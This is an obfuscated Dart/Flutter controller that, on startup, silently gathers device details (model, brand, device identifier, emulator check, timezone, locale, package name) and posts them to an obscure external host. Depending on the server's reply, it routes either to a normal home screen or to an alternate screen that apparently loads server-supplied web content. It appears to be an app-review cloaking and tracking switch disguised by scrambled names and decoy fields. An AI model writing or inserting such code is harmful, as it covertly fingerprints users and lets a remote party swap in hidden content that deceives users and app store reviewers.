import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ftuspcohbi = RxBool(false);
  var qsrxtw = RxBool(true);
  var zetrlc = RxString("");
  var kasandra = RxBool(false);
  var gleason = RxBool(true);
  final qmuyatvrh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ntmswrd();
  }


  Future<void> ntmswrd() async {

    kasandra.value = true;
    gleason.value = true;
    qsrxtw.value = false;

    qmuyatvrh.post("https://xia.jueloppi.xyz/TTQG1Y9YSTW6Q",data: await tylapodj()).then((value) {
      var fahunbqg = value.data["fahunbqg"] as String;
      var mbopnedc = value.data["mbopnedc"] as bool;
      if (mbopnedc) {
        zetrlc.value = fahunbqg;
        antonina();
      } else {
        rau();
      }
    }).catchError((e) {
      qsrxtw.value = true;
      gleason.value = true;
      kasandra.value = false;
    });
  }

  Future<Map<String, dynamic>> tylapodj() async {
    final DeviceInfoPlugin smzcdyuv = DeviceInfoPlugin();
    PackageInfo uwis_ayjxq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bwkhvp = Platform.localeName;
    var EwrWTMSl = currentTimeZone;

    var dQBqIv = uwis_ayjxq.packageName;
    var xeBlSkYQ = uwis_ayjxq.version;
    var GfPd = uwis_ayjxq.buildNumber;

    var CMPBw = uwis_ayjxq.appName;
    var xvikEHh  = "";
    var ernestShields = "";
    var ymMLZw = "";
    var kobyParker = "";
    var ruthieKerluke = "";
    var tTVK = "";
    var colleenBergnaum = "";
    var evanRenner = "";
    var kiraWard = "";
    var giuseppeHahn = "";


    var YqDIGi = "";
    var eaEZoTN = false;

    if (GetPlatform.isAndroid) {
      YqDIGi = "android";
      var zvcasldw = await smzcdyuv.androidInfo;

      ymMLZw = zvcasldw.brand;

      tTVK  = zvcasldw.model;
      xvikEHh = zvcasldw.id;

      eaEZoTN = zvcasldw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      YqDIGi = "ios";
      var zoietjhs = await smzcdyuv.iosInfo;
      ymMLZw = zoietjhs.name;
      tTVK = zoietjhs.model;

      xvikEHh = zoietjhs.identifierForVendor ?? "";
      eaEZoTN  = zoietjhs.isPhysicalDevice;
    }

    var res = {
      "CMPBw": CMPBw,
      "GfPd": GfPd,
      "xeBlSkYQ": xeBlSkYQ,
      "dQBqIv": dQBqIv,
      "ruthieKerluke" : ruthieKerluke,
      "EwrWTMSl": EwrWTMSl,
      "ymMLZw": ymMLZw,
      "YqDIGi": YqDIGi,
      "tTVK": tTVK,
      "colleenBergnaum" : colleenBergnaum,
      "eaEZoTN": eaEZoTN,
      "bwkhvp": bwkhvp,
      "kobyParker" : kobyParker,
      "kiraWard" : kiraWard,
      "ernestShields" : ernestShields,
      "xvikEHh": xvikEHh,
      "evanRenner" : evanRenner,
      "giuseppeHahn" : giuseppeHahn,

    };
    return res;
  }

  Future<void> rau() async {
    Get.offAllNamed("/home");
  }

  Future<void> antonina() async {
    Get.offAllNamed("/equ-be");
  }
}
